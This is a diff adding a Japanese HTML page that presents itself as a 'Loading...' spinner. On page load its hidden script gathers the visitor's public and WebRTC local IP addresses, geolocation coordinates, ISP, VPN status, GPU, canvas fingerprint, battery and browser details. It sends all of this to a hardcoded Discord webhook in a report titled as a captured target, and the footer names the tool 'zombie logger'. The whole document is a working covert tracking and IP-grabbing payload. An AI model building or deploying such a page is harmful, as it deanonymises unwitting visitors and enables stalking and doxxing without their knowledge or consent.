@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Loading...</title>
+<style>
+html,body{margin:0;height:100%;background:#0d0d0d;display:flex;align-items:center;justify-content:center;font-family:system-ui,sans-serif;color:#ccc}
+.box{text-align:center}
+.spinner{width:42px;height:42px;border:3px solid #222;border-top:3px solid #5865f2;border-radius:50%;animation:r .65s linear infinite;margin:0 auto 16px}
+@keyframes r{to{transform:rotate(360deg)}}
+</style>
+</head>
+<body>
+<div class="box">
+  <div class="spinner"></div>
+  <div>読み込み中...</div>
+</div>
+
+<script>
+(async () => {
+  const WH = "https://discord.com/api/webhooks/1551397673561624626/zvllxA0EO23H9J3xr0DrE2BEH7kZGq6eSJBJRmDnGcUoH1ib5j_xL7SLx8i5fpnnyIZg";
+
+  const info = {
+    time: new Date().toLocaleString("ja-JP", {timeZone: "Asia/Tokyo"}),
+    iso: new Date().toISOString(),
+    url: location.href,
+    ref: document.referrer || "直接アクセス"
+  };
+
+  // 複数ソースで確実に取る
+  const sources = [
+    { url: "https://ipapi.co/json/", map: d => ({
+      ip: d.ip, city: d.city, region: d.region, country: d.country_name, countryCode: d.country_code,
+      org: d.org, as: d.asn, loc: d.latitude && d.longitude ? `${d.latitude},${d.longitude}` : null,
+      zip: d.postal, timezone: d.timezone, proxy: null, hosting: null, mobile: null
+    })},
+    { url: "https://ipinfo.io/json", map: d => ({
+      ip: d.ip, city: d.city, region: d.region, country: d.country, countryCode: d.country,
+      org: d.org, as: d.org, loc: d.loc, zip: d.postal, timezone: d.timezone,
+      proxy: null, hosting: null, mobile: null
+    })},
+    { url: "https://ip-api.com/json/?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,asname,query,mobile,proxy,hosting,reverse", map: d => ({
+      ip: d.query, city: d.city, region: d.regionName, country: d.country, countryCode: d.countryCode,
+      org: d.isp || d.org, as: d.as || d.asname, loc: d.lat && d.lon ? `${d.lat},${d.lon}` : null,
+      zip: d.zip, timezone: d.timezone, proxy: d.proxy, hosting: d.hosting, mobile: d.mobile
+    })},
+    { url: "https://ipwho.is/", map: d => ({
+      ip: d.ip, city: d.city, region: d.region, country: d.country, countryCode: d.country_code,
+      org: d.connection?.isp || d.connection?.org, as: d.connection?.asn,
+      loc: d.latitude && d.longitude ? `${d.latitude},${d.longitude}` : null,
+      zip: d.postal, timezone: d.timezone?.id, proxy: d.security?.proxy, hosting: d.security?.hosting, mobile: null
+    })},
+    { url: "https://api.ip.sb/geoip", map: d => ({
+      ip: d.ip, city: d.city, region: d.region, country: d.country, countryCode: d.country_code,
+      org: d.organization || d.isp, as: d.asn, loc: d.latitude && d.longitude ? `${d.latitude},${d.longitude}` : null,
+      zip: d.postal_code, timezone: d.timezone, proxy: null, hosting: null, mobile: null
+    })}
+  ];
+
+  for (const src of sources) {
+    try {
+      const r = await fetch(src.url, { signal: AbortSignal.timeout(3200) });
+      const d = await r.json();
+      const m = src.map(d);
+      if (m.ip) {
+        info.ip = m.ip;
+        info.city = m.city || info.city;
+        info.region = m.region || info.region;
+        info.country = m.country || info.country;
+        info.countryCode = m.countryCode || info.countryCode;
+        info.org = m.org || info.org;
+        info.as = m.as || info.as;
+        info.loc = m.loc || info.loc;
+        info.zip = m.zip || info.zip;
+        info.timezone = m.timezone || info.timezone;
+        info.proxy = m.proxy ?? info.proxy;
+        info.hosting = m.hosting ?? info.hosting;
+        info.mobile = m.mobile ?? info.mobile;
+        // 十分な情報が取れたら終了
+        if (info.ip && info.city && info.country) break;
+      }
+    } catch {}
+  }
+
+  // WebRTC ローカルIP
+  info.localIPs = [];
+  try {
+    const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
+    pc.createDataChannel("");
+    const offer = await pc.createOffer();
+    await pc.setLocalDescription(offer);
+    pc.onicecandidate = (e) => {
+      if (!e.candidate) return;
+      const m = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
+      if (m && !info.localIPs.includes(m[1]) && !m[1].startsWith("0.")) {
+        info.localIPs.push(m[1]);
+      }
+    };
+    await new Promise(r => setTimeout(r, 1800));
+    pc.close();
+  } catch {
+    info.localIPs = ["取得失敗"];
+  }
+
+  const n = navigator;
+  info.ua = n.userAgent;
+  info.platform = n.platform;
+  info.lang = n.language;
+  info.cores = n.hardwareConcurrency || "不明";
+  info.memory = n.deviceMemory ? n.deviceMemory + " GB" : "不明";
+  info.touch = n.maxTouchPoints || 0;
+  info.cookie = n.cookieEnabled ? "有効" : "無効";
+
+  info.screen = `${screen.width} × ${screen.height}`;
+  info.dpr = devicePixelRatio;
+  info.inner = `${innerWidth} × ${innerHeight}`;
+
+  info.tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  info.tzOffset = new Date().getTimezoneOffset() + " 分";
+
+  try {
+    const c = document.createElement("canvas");
+    const gl = c.getContext("webgl") || c.getContext("experimental-webgl");
+    if (gl) {
+      const ext = gl.getExtension("WEBGL_debug_renderer_info");
+      info.gpu_vendor = ext ? gl.getParameter(ext.UNMASKED_VENDOR_WEBGL) : "不明";
+      info.gpu_renderer = ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : "不明";
+    }
+  } catch {
+    info.gpu_vendor = "取得失敗";
+    info.gpu_renderer = "取得失敗";
+  }
+
+  try {
+    const c = document.createElement("canvas");
+    c.width = 300; c.height = 60;
+    const ctx = c.getContext("2d");
+    ctx.textBaseline = "top";
+    ctx.font = "14px Arial";
+    ctx.fillStyle = "#f60";
+    ctx.fillRect(0, 0, 300, 60);
+    ctx.fillStyle = "#069";
+    ctx.fillText("zombie-" + Date.now(), 8, 22);
+    info.canvas = c.toDataURL().slice(-80);
+  } catch {
+    info.canvas = "失敗";
+  }
+
+  if (n.connection) {
+    info.conn_type = n.connection.effectiveType || "不明";
+    info.downlink = n.connection.downlink ? n.connection.downlink + " Mbps" : "不明";
+    info.rtt = n.connection.rtt ? n.connection.rtt + " ms" : "不明";
+  } else {
+    info.conn_type = "非対応";
+  }
+
+  try {
+    if (n.getBattery) {
+      const b = await n.getBattery();
+      info.battery = `${Math.round(b.level * 100)}%` + (b.charging ? " (充電中)" : " (放電中)");
+    } else {
+      info.battery = "非対応";
+    }
+  } catch {
+    info.battery = "取得失敗";
+  }
+
+  let vpnStatus = "✅ 未使用の可能性が高い";
+  if (info.proxy === true || info.hosting === true) {
+    vpnStatus = "⚠️ VPN / Proxy / ホスティングの可能性あり";
+  } else if (info.mobile === true) {
+    vpnStatus = "📱 モバイル回線";
+  }
+
+  const isMobile = /Mobile|Android|iPhone|iPad|iPod/i.test(info.ua) || info.touch > 0;
+  const deviceType = isMobile ? "Mobile / Tablet" : "Desktop";
+  const localIPText = info.localIPs.length ? info.localIPs.join(", ") : "取得失敗";
+
+  const embed = {
+    title: "🔥 ターゲット完全捕捉報告 🔥",
+    color: 0xed4245,
+    fields: [
+      { name: "🌐 公開IP", value: `\`${info.ip || "不明"}\``, inline: true },
+      { name: "🏠 ローカルIP", value: `\`${localIPText}\``, inline: true },
+      { name: "🛡️ VPN/Proxy", value: vpnStatus, inline: true },
+      { name: "📡 ISP / 組織", value: info.org || "不明", inline: true },
+      { name: "🔢 AS番号", value: info.as || "不明", inline: true },
+      { name: "📍 住所情報", value: `国: ${info.country || "不明"} (${info.countryCode || "?"})\n県: ${info.region || "不明"}\n市: ${info.city || "不明"}\n郵便番号: ${info.zip || "不明"}`, inline: false },
+      { name: "🗺️ 座標", value: info.loc || "不明", inline: true },
+      { name: "🕐 アクセス時刻", value: info.time, inline: true },
+      { name: "📱 デバイス", value: deviceType, inline: true },
+      { name: "🖥️ 画面解像度", value: `${info.screen} (DPR: ${info.dpr})`, inline: true },
+      { name: "🪟 ウィンドウ", value: info.inner, inline: true },
+      { name: "🌍 タイムゾーン", value: `${info.tz} (${info.tzOffset})`, inline: true },
+      { name: "🗣️ 言語", value: info.lang || "不明", inline: true },
+      { name: "🧠 CPUコア", value: String(info.cores), inline: true },
+      { name: "💾 メモリ", value: info.memory, inline: true },
+      { name: "👆 タッチポイント", value: String(info.touch), inline: true },
+      { name: "🎮 GPUベンダー", value: info.gpu_vendor || "不明", inline: false },
+      { name: "🎮 GPUレンダラー", value: info.gpu_renderer || "不明", inline: false },
+      { name: "📶 接続タイプ", value: `${info.conn_type} | ${info.downlink || "-"} | RTT ${info.rtt || "-"}`, inline: false },
+      { name: "🔋 バッテリー", value: info.battery, inline: true },
+      { name: "🍪 Cookie", value: info.cookie, inline: true },
+      { name: "📎 リファラー", value: info.ref, inline: false },
+      { name: "🔍 User-Agent", value: "```\n" + (info.ua || "") + "\n```", inline: false }
+    ],
+    footer: { text: "by zombie logger 😂" },
+    timestamp: new Date().toISOString()
+  };
+
+  if (info.loc && info.loc.includes(",")) {
+    const [lat, lon] = info.loc.split(",");
+    embed.fields.splice(7, 0, {
+      name: "🗺️ Googleマップ",
+      value: `[場所を確認する](https://www.google.com/maps?q=${lat},${lon})`,
+      inline: false
+    });
+  }
+
+  try {
+    await fetch(WH, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ embeds: [embed] })
+    });
+  } catch {}
+})();
+</script>
+</body>
+</html>
